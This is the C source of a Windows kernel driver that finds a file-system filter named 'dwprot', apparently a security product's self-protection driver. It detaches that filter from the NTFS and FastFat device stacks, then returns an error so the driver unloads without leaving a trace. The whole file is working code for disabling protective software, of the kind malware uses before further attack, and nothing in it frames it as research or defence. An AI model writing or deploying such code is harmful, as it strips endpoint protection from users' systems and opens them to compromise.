#include ".\nulldrv\defines.h"
#include ".\nulldrv\ntoskrnl.h"
#include ".\nulldrv\rtl.h"

PDRIVER_OBJECT 
NTAPI
IoGetDriverObjectByName(
	IN PWSTR DriverLink
	)
{
	UNICODE_STRING DriverObjectName;
	PDRIVER_OBJECT drv1 = NULL;
	NTSTATUS       Status;

//	DbgPrint("[~] Getting DriverObjectByName : %ws", DriverLink);
	
	RtlInitUnicodeString(&DriverObjectName, DriverLink);
	Status = ObReferenceObjectByName(&DriverObjectName, FILE_ATTRIBUTE_DEVICE, 0, 
		OBJ_CASE_INSENSITIVE, IoDriverObjectType, KernelMode, 0, (PVOID *)&drv1);
	if (NT_SUCCESS(Status))
	{	
		ObfDereferenceObject(drv1);
	}
//	DbgPrint("[~] Result of operation %lx", Status);
	return drv1;
}

VOID DetachFilter2(PDRIVER_OBJECT drvobj, PDRIVER_OBJECT DwProt)
{
	PDEVICE_OBJECT Prev, DeviceObject = NULL;

	Prev = NULL;
	DeviceObject = drvobj->DeviceObject;

	for( ; DeviceObject->AttachedDevice ; Prev = DeviceObject, DeviceObject = DeviceObject->AttachedDevice) {
		if (DeviceObject->DriverObject == DwProt) {
		//	DbgPrint("[~] Found DWPROT filter DEVICE_OBJECT %lx, detaching from %lx", DeviceObject, Prev);
			IoDetachDevice(Prev);
		}
	}
}

#define FILESYSTEM  L"\\FileSystem\\"
#define DWPROT      L"dwprot"
#define NTFS        L"ntfs"
#define FASTFAT		L"fastfat"

VOID DetachFilter()
{
	PDRIVER_OBJECT drvobj = NULL;
	PDRIVER_OBJECT DwProt = NULL;

	WCHAR obname[60];
	RtlZeroMemory(obname, sizeof(obname));

	strcpyW(obname, FILESYSTEM);
	strcatW(obname, DWPROT);

	DwProt = IoGetDriverObjectByName(obname);
	if (!DwProt) return;

	strcpyW(obname, FILESYSTEM);
	strcatW(obname, NTFS);

	drvobj = IoGetDriverObjectByName(obname);
	if (drvobj) {
		DetachFilter2(drvobj, DwProt);
	}

	strcpyW(obname, FILESYSTEM);
	strcatW(obname, FASTFAT);

	drvobj = IoGetDriverObjectByName(obname);
	if (drvobj) {
		DetachFilter2(drvobj, DwProt);
	}

}

NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	DbgPrint("Bonjourno!");

	DetachFilter();

	return 0xC0000189;
}